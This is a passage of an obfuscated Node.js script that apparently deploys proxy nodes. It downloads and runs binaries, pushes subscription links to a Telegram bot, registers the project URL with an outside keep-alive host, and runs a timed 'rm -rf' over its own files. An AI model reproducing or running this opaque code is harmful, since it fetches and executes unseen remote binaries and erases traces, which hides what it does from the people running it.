          ;(console[_0x353aa7(_0xb133a._0x16c638)](),
            alwaysLog(_0x353aa7(_0xb133a._0x1e498d)),
            console[_0x353aa7(0x1e7)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!'))
        })
      : exec('rm\x20-rf\x20' + _0xe37e6b[_0x420463(_0x27d8e9._0x44bf27)]('\x20') + _0x420463(_0x27d8e9._0x43882c), (_0x452393) => {
          const _0x8f882f = _0x420463
          ;(console[_0x8f882f(_0x2f0cc0._0x56b317)](), alwaysLog(_0x8f882f(0x16c)), console['log'](_0x8f882f(0x1cd)))
        })
  }, 0x15f90)
}
cleanFiles()
async function sendTelegram() {
  const _0xa1d1b0 = { _0x5c4b6b: 0x1e7, _0x42c8f9: 0x143, _0x11a20b: 0x1a3, _0x5cc44b: 0x117, _0x35fc9e: 0x11e, _0x3b5d6e: 0x193 },
    _0x1a19d6 = _0x5c9a9f
  if (!BOT_TOKEN || !CHAT_ID) {
    console[_0x1a19d6(_0xa1d1b0._0x5c4b6b)]('TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG')
    return
  }
  try {
    const _0x7de292 = fs[_0x1a19d6(0x12c)](subPath, _0x1a19d6(_0xa1d1b0._0x42c8f9)),
      _0x3b26b4 = _0x1a19d6(0x175) + BOT_TOKEN + _0x1a19d6(0x191),
      _0x29a508 = NAME[_0x1a19d6(0x124)](/[_*\[\]()~`>#+=|{}.!-]/g, _0x1a19d6(_0xa1d1b0._0x11a20b)),
      _0x1ca296 = {
        chat_id: CHAT_ID,
        text: '**' + _0x29a508 + _0x1a19d6(0x125) + _0x7de292 + _0x1a19d6(_0xa1d1b0._0x5cc44b),
        parse_mode: _0x1a19d6(_0xa1d1b0._0x35fc9e)
      }
    ;(await axios[_0x1a19d6(0x114)](_0x3b26b4, null, { params: _0x1ca296 }), console[_0x1a19d6(_0xa1d1b0._0x5c4b6b)](_0x1a19d6(_0xa1d1b0._0x3b5d6e)))
  } catch (_0x1a69ef) {
    console[_0x1a19d6(0x13d)](_0x1a19d6(0x1cf), _0x1a69ef[_0x1a19d6(0x19a)])
  }
}
async function AddVisitTask() {
  const _0x24e011 = { _0x2a15b5: 0x1e7 },
    _0x532761 = _0x5c9a9f
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console[_0x532761(0x1e7)]('Skipping\x20adding\x20automatic\x20access\x20task')
    return
  }
  try {
    const _0x1c8433 = await axios['post']('https://oooo.serv00.net/add-url', { url: PROJECT_URL }, { headers: { 'Content-Type': _0x532761(0x1f2) } })
    return (console[_0x532761(_0x24e011._0x2a15b5)]('automatic\x20access\x20task\x20added\x20successfully'), _0x1c8433)
  } catch (_0x17379a) {
    return (console['error'](_0x532761(0x160) + _0x17379a[_0x532761(0x19a)]), null)
  }
}
async function startserver() {
  const _0x59196c = _0x5c9a9f
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram(),
      await AddVisitTask())
  } catch (_0x22d211) {
    console[_0x59196c(0x13d)]('Error\x20in\x20startserver:', _0x22d211)
  }
}
startserver()[_0x5c9a9f(0x1fb)]((_0x9e379b) => {
  const _0x4052e1 = _0x5c9a9f
  console['error'](_0x4052e1(0x1ea), _0x9e379b)
})
const server = http[_0x5c9a9f(0x179)](async (_0x14b90e, _0x4e9a94) => {
  const _0x105d2b = {
      _0x4088f6: 0x11b,
      _0x1d267d: 0x192,
      _0x3ab8c1: 0x17e,
      _0x2e1ace: 0x178,
      _0x5e0755: 0x1a0,
      _0x40c4a7: 0x203,
      _0x2690e7: 0x1e0,
      _0x96ba8f: 0x143,
      _0x4dd2d6: 0x192,
      _0x283d25: 0x1d7,
      _0x359d38: 0x1cb,
      _0x552f66: 0x1fd
    },
    _0x21708c = _0x5c9a9f,
    _0x11cae8 = _0x14b90e[_0x21708c(_0x105d2b._0x4088f6)]['split']('?')[0x0]
  if (_0x11cae8 === '/' + SUB_PATH) {
    if (subContent)
      (_0x4e9a94[_0x21708c(_0x105d2b._0x1d267d)](0xc8, { 'Content-Type': _0x21708c(0x178) }), _0x4e9a94[_0x21708c(_0x105d2b._0x3ab8c1)](subContent))
    else
      try {
        const _0x583097 = fs['readFileSync'](subPath, _0x21708c(0x182))
        ;(_0x4e9a94[_0x21708c(0x192)](0xc8, { 'Content-Type': _0x21708c(_0x105d2b._0x2e1ace) }), _0x4e9a94['end'](_0x583097))
      } catch (_0x443bdf) {
        ;(_0x4e9a94[_0x21708c(0x192)](0x1f7, { 'Content-Type': 'text/plain;\x20charset=utf-8' }),
          _0x4e9a94[_0x21708c(_0x105d2b._0x3ab8c1)](_0x21708c(_0x105d2b._0x5e0755)))
      }
    return
  }
  if (_0x11cae8 === '/') {
    try {
      const _0x520db5 = path[_0x21708c(0x173)](__dirname, _0x21708c(0x17c)),
        _0x14543c = await fs[_0x21708c(_0x105d2b._0x40c4a7)][_0x21708c(_0x105d2b._0x2690e7)](_0x520db5, _0x21708c(_0x105d2b._0x96ba8f))
      ;(_0x4e9a94[_0x21708c(_0x105d2b._0x4dd2d6)](0xc8, { 'Content-Type': _0x21708c(_0x105d2b._0x283d25) }), _0x4e9a94['end'](_0x14543c))
    } catch (_0xc9210f) {
      ;(_0x4e9a94[_0x21708c(_0x105d2b._0x1d267d)](0xc8, { 'Content-Type': 'text/html;\x20charset=utf-8' }),
        _0x4e9a94['end'](_0x21708c(_0x105d2b._0x359d38)))
    }
    return
  }
  ;(_0x4e9a94[_0x21708c(0x192)](0x194, { 'Content-Type': _0x21708c(_0x105d2b._0x2e1ace) }),
    _0x4e9a94[_0x21708c(0x17e)](_0x21708c(_0x105d2b._0x552f66)))
})
server[_0x5c9a9f(0x111)](PORT, () => alwaysLog(_0x5c9a9f(0x141) + PORT + '!'))
